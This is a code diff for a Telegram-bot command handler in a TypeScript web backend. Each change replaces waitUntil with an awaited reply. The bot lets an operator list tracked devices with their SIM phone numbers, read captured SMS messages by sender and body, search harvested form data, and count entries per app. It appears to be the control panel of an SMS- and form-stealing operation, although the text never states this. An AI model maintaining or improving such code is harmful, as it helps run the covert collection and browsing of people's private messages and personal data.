@@ -1471,7 +1471,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     if (txt === '/1h' || txt.startsWith('/1h ')) {
       const { msgs, forms } = await getRecentData(c.env, 1);
       const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 1 Hour');
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1479,7 +1479,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     if (txt === '/24h' || txt.startsWith('/24h ')) {
       const { msgs, forms } = await getRecentData(c.env, 24);
       const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 24 Hours');
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1496,7 +1496,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         `📱 Devices: <b>${(devsC[0] as {c:string}).c}</b>\n` +
         `📩 Messages: <b>${(msgsC[0] as {c:string}).c}</b>\n` +
         `📋 Form Data: <b>${(formsC[0] as {c:string}).c}</b>`;
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1509,7 +1509,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         out += `${r.status === 'active' ? '🟢' : '🔴'} <code>${r.appId}</code> — ${r.name}\n`;
       });
       out += `\n💡 /app &lt;appId&gt; — detail dekhne ke liye`;
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1521,7 +1521,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       const searchQuery = parts.slice(2).join(' ').toLowerCase() || null;
 
       if (!appId) {
-        c.executionCtx.waitUntil(tgReply(token, chatId, '❌ Usage: /app &lt;appId&gt; [deviceId] [searchText]'));
+        await tgReply(token, chatId, '❌ Usage: /app &lt;appId&gt; [deviceId] [searchText]');
         return c.json({ ok: true });
       }
 
@@ -1547,7 +1547,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
             out += `• ${fields.substring(0, 120)}\n`;
           });
         }
-        c.executionCtx.waitUntil(tgReply(token, chatId, out));
+        await tgReply(token, chatId, out);
         return c.json({ ok: true });
       }
 
@@ -1581,7 +1581,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
           });
         }
         out += `\n💡 Search: /app ${appId} ${deviceId} &lt;text&gt;`;
-        c.executionCtx.waitUntil(tgReply(token, chatId, out));
+        await tgReply(token, chatId, out);
         return c.json({ ok: true });
       }
 
@@ -1602,7 +1602,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         });
         out += `\n💡 Device detail: /app ${appId} &lt;deviceId&gt;`;
       }
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1610,7 +1610,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     if (txt.startsWith('/search ')) {
       const query = txt.slice(8).trim().toLowerCase();
       if (!query) {
-        c.executionCtx.waitUntil(tgReply(token, chatId, '❌ Usage: /search &lt;text&gt;'));
+        await tgReply(token, chatId, '❌ Usage: /search &lt;text&gt;');
         return c.json({ ok: true });
       }
       await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'true') ON CONFLICT (key) DO UPDATE SET value = 'true'`);
@@ -1637,7 +1637,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         });
       }
       out += `\n\n▶️ /stop — notifications resume karne ke liye`;
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1645,7 +1645,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     if (txt === '/7d' || txt.startsWith('/7d ')) {
       const { msgs, forms } = await getRecentData(c.env, 168);
       const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 7 Days');
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1657,7 +1657,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       rows.forEach(d => {
         out += `📱 <b>${d.name}</b>\n  App: <code>${d.appId}</code>\n  ID: <code>${d.deviceId}</code>\n  SIM: ${d.sim1Phone ?? '—'}\n`;
       });
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1670,7 +1670,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         const last = d.lastOnline ? new Date(d.lastOnline).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : 'Never';
         out += `📵 <b>${d.name}</b>\n  App: <code>${d.appId}</code>\n  Last Online: ${last}\n`;
       });
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1678,7 +1678,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     if (txt.startsWith('/dev ')) {
       const devId = txt.slice(5).trim();
       if (!devId) {
-        c.executionCtx.waitUntil(tgReply(token, chatId, '❌ Usage: /dev &lt;deviceId&gt;'));
+        await tgReply(token, chatId, '❌ Usage: /dev &lt;deviceId&gt;');
         return c.json({ ok: true });
       }
       const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
@@ -1689,7 +1689,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE device_id=$1`, [devId]),
       ]);
       if (!devRow[0]) {
-        c.executionCtx.waitUntil(tgReply(token, chatId, `❌ Device <code>${devId}</code> nahi mila.`));
+        await tgReply(token, chatId, `❌ Device <code>${devId}</code> nahi mila.`);
         return c.json({ ok: true });
       }
       const d = devRow[0];
@@ -1712,7 +1712,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         });
       }
       out += `\n💡 Detail: /app ${d.appId} ${devId}`;
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1725,7 +1725,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       (rows as Array<Record<string,unknown>>).forEach(m => {
         out += `• <code>${m.app_id}</code> | <b>${m.from_number}</b>\n  ${String(m.body).substring(0, 90)}\n`;
       });
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1745,7 +1745,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         const st = r.status === 'active' ? '🟢' : '🔴';
         out += `${st} <code>${r.appId}</code>\n  📱${r.d} | 📩${r.m} | 📋${r.f}\n`;
       });
-      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
@@ -1753,7 +1753,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
   
     if (txt === '/stop' || txt === '/release') {
       await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'false') ON CONFLICT (key) DO UPDATE SET value = 'false'`);
-      c.executionCtx.waitUntil(tgReply(token, chatId, '▶️ <b>Notifications resumed!</b>\nAb se phir se notifications aayengi. 🔔'));
+      await tgReply(token, chatId, '▶️ <b>Notifications resumed!</b>\nAb se phir se notifications aayengi. 🔔');
       return c.json({ ok: true });
     }
 
@@ -1775,7 +1775,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         `📱 /dev &lt;deviceId&gt; — Quick device lookup\n` +
         `🔎 /search &lt;text&gt; — Global search (notifications pause)\n` +
         `▶️ /stop — Notifications resume\n`;
-      c.executionCtx.waitUntil(tgReply(token, chatId, help));
+      await tgReply(token, chatId, help);
       return c.json({ ok: true });
     }
 
